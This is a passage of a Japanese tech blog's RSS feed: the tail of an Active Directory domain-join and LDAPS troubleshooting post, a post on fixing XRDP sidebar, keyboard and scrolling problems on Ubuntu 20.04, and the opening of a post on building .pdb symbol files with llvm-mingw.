- ドメイン コントローラの名前を IP アドレスに割り当てるための Host &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;A&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; レコードが見つからないか、正しくないアドレスを含んでいる。
- DNS で登録されているドメイン コントローラがネットワークに接続されていないか、実行中でない。&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;僕の環境では、複数NIC構成でADを作成した際にこの問題が発生しており、ADサーバに割り当てるNICを一つにした状態でADを再作成したら解消されました。&lt;/p&gt;
&lt;h3 id=&quot;連携がうまくいかないときは&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E9%80%A3%E6%90%BA%E3%81%8C%E3%81%86%E3%81%BE%E3%81%8F%E3%81%84%E3%81%8B%E3%81%AA%E3%81%84%E3%81%A8%E3%81%8D%E3%81%AF&quot; aria-label=&quot;連携がうまくいかないときは permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;連携がうまくいかないときは&lt;/h3&gt;
&lt;p&gt;以下を確認してみる。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;http://niyodiary.cocolog-nifty.com/blog/2009/09/pc-499b.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ドメイン参加時にクライアントPC・サーバー設定で気をつけること: niyoな日記&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;以下の記事も参考にしました。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://validationmemo.blogspot.com/2019/01/active-directory.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ValidationMemo: Active Directoryのドメイン名を検討するときに考えるべきこと&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;ldapsを有効にしてアプリケーションとad連携する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ldaps%E3%82%92%E6%9C%89%E5%8A%B9%E3%81%AB%E3%81%97%E3%81%A6%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%A8ad%E9%80%A3%E6%90%BA%E3%81%99%E3%82%8B&quot; aria-label=&quot;ldapsを有効にしてアプリケーションとad連携する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;LDAPSを有効にしてアプリケーションとAD連携する&lt;/h2&gt;
&lt;p&gt;LDAPSを利用して他のアプリケーションとAD連携を行うには、以下の記事が参考になりました。&lt;/p&gt;
&lt;p&gt;Acrive Directory 証明書サービスをインストールして自己証明書で認証を行うだけれあれば、非常に簡単に設定できます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://kmmr.jp/post-413/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Active DirectoryのLDAPS通信を有効化する | KMMR Note&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://blog.putise.com/windows-ad%E3%81%AEldaps%E6%9C%89%E5%8A%B9%E5%8C%96%E3%81%AE%E6%A7%8B%E7%AF%89%E6%96%B9%E6%B3%95/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Windows ADサーバーのLDAPS有効化の構築方法 | puti se blog&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;中々問題が解消できず、トラブルシューティングにかなり時間がかかりました。&lt;/p&gt;
&lt;p&gt;やっぱりAD連携そのものへの理解が不足しているとトラシューにも時間がかかりますね。&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Ubuntu20.04にXRDP接続した際に起きた問題についてのまとめ]]></title><description><![CDATA[この記事では、Ubuntuマシンに対してXRDP接続を行ったときに発生した問題についてまとめています。]]></description><link>https://kashiwaba-yuki.com/linux-trouble-ubuntu-rdp</link><guid isPermaLink="false">https://kashiwaba-yuki.com/linux-trouble-ubuntu-rdp</guid><pubDate>Tue, 30 Nov 2021 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;この記事では、Ubuntuマシンに対してXRDP接続を行ったときに発生した問題についてまとめていきます。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#ubuntu%E3%81%ABxrdp%E3%81%A7%E6%8E%A5%E7%B6%9A%E3%81%99%E3%82%8B%E3%81%A8%E3%81%8D%E3%81%AB%E3%82%B5%E3%82%A4%E3%83%89%E3%83%90%E3%83%BC%E3%82%92%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B%E8%A8%AD%E5%AE%9A&quot;&gt;UbuntuにXRDPで接続するときにサイドバーを表示する設定&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ubuntu%E3%81%ABxrdp%E6%8E%A5%E7%B6%9A%E3%81%97%E3%81%9F%E3%81%A8%E3%81%8D%E3%81%AB%E6%97%A5%E6%9C%AC%E8%AA%9E%E3%82%AD%E3%83%BC%E3%83%9C%E3%83%BC%E3%83%89%E8%A8%AD%E5%AE%9A%E3%81%8C%E5%88%A9%E3%81%8B%E3%81%AA%E3%81%8F%E3%81%AA%E3%82%8B%E5%95%8F%E9%A1%8C%E3%81%AE%E5%AF%BE%E5%87%A6&quot;&gt;UbuntuにXRDP接続したときに日本語キーボード設定が利かなくなる問題の対処&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%96%E3%83%A9%E3%82%A6%E3%82%B6%E9%96%B2%E8%A6%A7%E6%99%82%E3%81%AE%E3%82%B9%E3%82%AF%E3%83%AD%E3%83%BC%E3%83%AB%E6%93%8D%E4%BD%9C%E3%81%8C%E9%81%85%E3%81%84%E5%95%8F%E9%A1%8C&quot;&gt;ブラウザ閲覧時のスクロール操作が遅い問題&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;ubuntuにxrdpで接続するときにサイドバーを表示する設定&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ubuntu%E3%81%ABxrdp%E3%81%A7%E6%8E%A5%E7%B6%9A%E3%81%99%E3%82%8B%E3%81%A8%E3%81%8D%E3%81%AB%E3%82%B5%E3%82%A4%E3%83%89%E3%83%90%E3%83%BC%E3%82%92%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B%E8%A8%AD%E5%AE%9A&quot; aria-label=&quot;ubuntuにxrdpで接続するときにサイドバーを表示する設定 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;UbuntuにXRDPで接続するときにサイドバーを表示する設定&lt;/h2&gt;
&lt;p&gt;UbuntuなどのLinuxマシンを建てたときに、ホストからRDPでアクセスするためにXRDPを使用します。&lt;/p&gt;
&lt;p&gt;この場合、ただXRDPを使うだけなら以下のようなコマンドだけでも問題ないのですが、Ubuntuの場合はアプリケーションランチャーになるサイドバーが表示されなくなってしまいます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; -y xrdp
&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; systemctl &lt;span class=&quot;token builtin class-name&quot;&gt;enable&lt;/span&gt; xrdp&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;その場合は、ホームディレクトリに&lt;code class=&quot;language-text&quot;&gt;.xsessionrc&lt;/code&gt;を作成し必要な接敵を書き込むことでサイドバーを表示させることができるようになります。&lt;/p&gt;
&lt;p&gt;具体的には、以下のコマンドをコピペするだけです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# ~/.xsessionrc に書き込む&lt;/span&gt;
&lt;span class=&quot;token builtin class-name&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;GNOME_SHELL_SESSION_MODE&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;ubuntu
&lt;span class=&quot;token builtin class-name&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;&lt;span class=&quot;token environment constant&quot;&gt;XDG_CURRENT_DESKTOP&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;ubuntu:GNOME
&lt;span class=&quot;token builtin class-name&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;&lt;span class=&quot;token environment constant&quot;&gt;XDG_DATA_DIRS&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;/usr/share/ubuntu:/usr/local/share:/usr/share:/var/lib/snapd/desktop

&lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;EOF&lt;span class=&quot;token bash punctuation&quot;&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; ~/.xsessionrc&lt;/span&gt;
export XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg
EOF&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上記のコマンドで&lt;code class=&quot;language-text&quot;&gt;.xsessionrc&lt;/code&gt;が作成されたら、以下のコマンドでサービスを再起動します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; systemctl restart xrdp&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.hiroom2.com/2018/04/28/ubuntu-1804-xrdp-gnome-ja/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Ubuntu 18.04: GNOMEデスクトップ環境にXRDPで接続する - Narrow Escape&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;ubuntuにxrdp接続したときに日本語キーボード設定が利かなくなる問題の対処&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ubuntu%E3%81%ABxrdp%E6%8E%A5%E7%B6%9A%E3%81%97%E3%81%9F%E3%81%A8%E3%81%8D%E3%81%AB%E6%97%A5%E6%9C%AC%E8%AA%9E%E3%82%AD%E3%83%BC%E3%83%9C%E3%83%BC%E3%83%89%E8%A8%AD%E5%AE%9A%E3%81%8C%E5%88%A9%E3%81%8B%E3%81%AA%E3%81%8F%E3%81%AA%E3%82%8B%E5%95%8F%E9%A1%8C%E3%81%AE%E5%AF%BE%E5%87%A6&quot; aria-label=&quot;ubuntuにxrdp接続したときに日本語キーボード設定が利かなくなる問題の対処 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;UbuntuにXRDP接続したときに日本語キーボード設定が利かなくなる問題の対処&lt;/h2&gt;
&lt;p&gt;デフォルトの状態でXRDP経由のアクセスをした場合、UbuntuのキーボードがUS配列になってしまう場合があります。&lt;/p&gt;
&lt;p&gt;その問題を回避するために、以下の設定を実施します。&lt;/p&gt;
&lt;p&gt;まずは、設定画面を開きます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;gnome-session-properties&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;次に、[Add] をクリックして、NameとCommandに、それぞれ以下を入力します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# Name&lt;/span&gt;
Set JP keyboard on X startup

&lt;span class=&quot;token comment&quot;&gt;# Command&lt;/span&gt;
setxkbmap jp&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;こちらが設定画面です。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/56934c44f3ea4c4b0a5dc05c1cae71ff/0b533/image-15.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 78.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAARlAAAEZQAGA43XUAAAEAklEQVQ4y2WS609TdxjHzxvJmEQ2BVflbrhpAQHLpVwKDLygUYQB4yK0KFBAkciYIoGwaYKJRtwYOJR7W2gtLRSYjiL4dtlf4WuGBMIILXPbZ7+eTbNsJ+eT5znP8zvf8zwnX6k2xovK+P2UqQ5RoVJQkSRikoJLKQqq1QFo04LQCbTqQKpSDslcShZnPKQEUKXy47JyD5djvaiJ2YPUFO/FmYRIUlVqMpNS0SSlk63KEmjITcnhVNpJTqrzyErMJC02lcz4dDLi08g8riYjMYv8xDgaj3uhj/eWkVpU3hQejSQjJI64g0Ec9z9Con80J/yjSFYoSQ+KQn04gljfcJnovaEofUKI3RdGjE8YeYpArqs+5HqSD80qH6Q29V6KI5WcUeah1VVTc1mHrkYrU99QT+PVBhqb9DQ0NaBv1KMTfc85T18v+rpP1bQkfsAXal9aU32ROjUfcfFIJJXZpTwzmzEZDZjNFiwWC/Pz8yz+uIjTuYRz0cnLpZe8WllheeWV3HvufElnrZYbiV60a/bTpt6HdCf3AEXhUZSoL2KcmKJvYJDKqktUVJRTV19H25dtdHTcFnTQ2nqDa83NtF2/Sv+jh0zPztFRU8nNZG86s/24mSYmvHf6ICVRRynPKWOkvYXB2iJGng5iNJkYG3rClHGCScO4jGFsRHx0DNvECIahQZ7NOOi6UkVXug/dOf50Zh1AenBWQUlENJ9nFjMuvjp6/y5rv6ziuVy/brHxZo3fXDv8vusWlT/F/YfcW1lexioEu+u13NH40nNKwd1cP6Tec8JPx5SUZRZhdziYXXjO69evWV1dZXNzk42NDVwuN2/fvsXtcsm17e1tlpyLsuDXei09OR/zIP8QPXkHkfoLAimNUlKcVozNZsUxO8ubtTUh4sLtdrO7uyvnrh2XHHfdu3JtyemUBb+q13E/7wC95wK4J6aUBouC0SdEcSXvPDa7DYeYcn19XX5pZ2fnPe9EPblbTPxOsKdJy8PTfnxzPlBMeRjpyWdHGC4M4mmdhmmb/X+CspDAs6ZnfU/c2toSFnJisTl4equavnOf8O2FYHrPCsHh0nCMpcFMNGYJQRtzQnB+bo4F4bN/4/HdnKj/HR1YhU9tjgWG2qsZOK/gu4IQeW1pvCwSS1kIhqbcfyacw26fwT4zI37BzPvc/p/carVin3/B8G0d319QMFAYSp9YWzKURzJdEcrUtRyMwmse33kwCyymccwmg/xsmTQIjEyZPBiYFH40mCYZulnJk4LDPC4Ko78gCMlYHsGzqmima2Kw1J5gui4Je0MKiw0nWO4+yw9d+by4lsxPrQn83K7BeSubqbpkxqvjGa1KYLTiGMMlYTwuDGHgYjB/AYgNGXLsrNnRAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/56934c44f3ea4c4b0a5dc05c1cae71ff/8ac56/image-15.webp 240w,
/static/56934c44f3ea4c4b0a5dc05c1cae71ff/d3be9/image-15.webp 480w,
/static/56934c44f3ea4c4b0a5dc05c1cae71ff/b0a15/image-15.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/56934c44f3ea4c4b0a5dc05c1cae71ff/8ff5a/image-15.png 240w,
/static/56934c44f3ea4c4b0a5dc05c1cae71ff/e85cb/image-15.png 480w,
/static/56934c44f3ea4c4b0a5dc05c1cae71ff/0b533/image-15.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/56934c44f3ea4c4b0a5dc05c1cae71ff/0b533/image-15.png&quot;
            alt=&quot;https://yukituna.com/wp-content/uploads/2021/11/image-15.png&quot;
            title=&quot;https://yukituna.com/wp-content/uploads/2021/11/image-15.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これでOSを再起動すると、次回のアクセスからJIS配列が反映されるようになりました。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://qiita.com/vochicong/items/6452ac54bde56b0e0bb3&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Ubuntu で日本語キーボードレイアウト - Qiita&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;ブラウザ閲覧時のスクロール操作が遅い問題&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%96%E3%83%A9%E3%82%A6%E3%82%B6%E9%96%B2%E8%A6%A7%E6%99%82%E3%81%AE%E3%82%B9%E3%82%AF%E3%83%AD%E3%83%BC%E3%83%AB%E6%93%8D%E4%BD%9C%E3%81%8C%E9%81%85%E3%81%84%E5%95%8F%E9%A1%8C&quot; aria-label=&quot;ブラウザ閲覧時のスクロール操作が遅い問題 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ブラウザ閲覧時のスクロール操作が遅い問題&lt;/h2&gt;
&lt;p&gt;XRDP経由でスクロール設定が反映されない問題は既知事象なのですが、長らく修正されていないようです。&lt;/p&gt;
&lt;p&gt;参考；&lt;a href=&quot;https://github.com/neutrinolabs/xorgxrdp/issues/150&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Vertical scroll speed too fast (xrdpMouse) · Issue #150 · neutrinolabs/xorgxrdp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;imwheelなどのツールを試しましたが効果はありませんでした。&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;個人的にハマった問題の解消方法をまとめました。&lt;/p&gt;
&lt;p&gt;Ubuntuのセットアップでまた困ったことがあれば、都度追記していきたいと思います。&lt;/p&gt;</content:encoded></item><item><title><![CDATA[llvm-mingwを使ってLinux環境でもシンボルファイル（.pdb）を作成する方法]]></title><link>https://kashiwaba-yuki.com/windows-windbg-006-symbol</link><guid isPermaLink="false">https://kashiwaba-yuki.com/windows-windbg-006-symbol</guid><pubDate>Mon, 18 Oct 2021 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;WinDbgによるWindowsデバッグやダンプ解析によるトラブルシューティングに習熟することを目指しています。&lt;/p&gt;
&lt;p&gt;WinDbgを用いたWindowsのデバッグやダンプの解析方法について公開している情報については、以下のページに一覧をまとめているので、よければご覧ください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-001-index&quot;&gt;WinDbgを用いたデバッグとトラブルシューティングのテクニック&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;今回は、上記のWinDbgまとめ記事で解析のために使用するサンプルプログラムをビルドする環境について紹介します。&lt;/p&gt;
&lt;p&gt;以下の要件を実現できる環境を、WSL2上のUbuntu20.04で構築していきます。
基本的にはDockerコンテナを使用するので、Dockerが動くならどの環境でも問題ないと思います。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Linux環境でEXEファイルをクロスコンパイルできる&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Linux環境でシンボルファイル（.pdbファイル）を生成できる&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
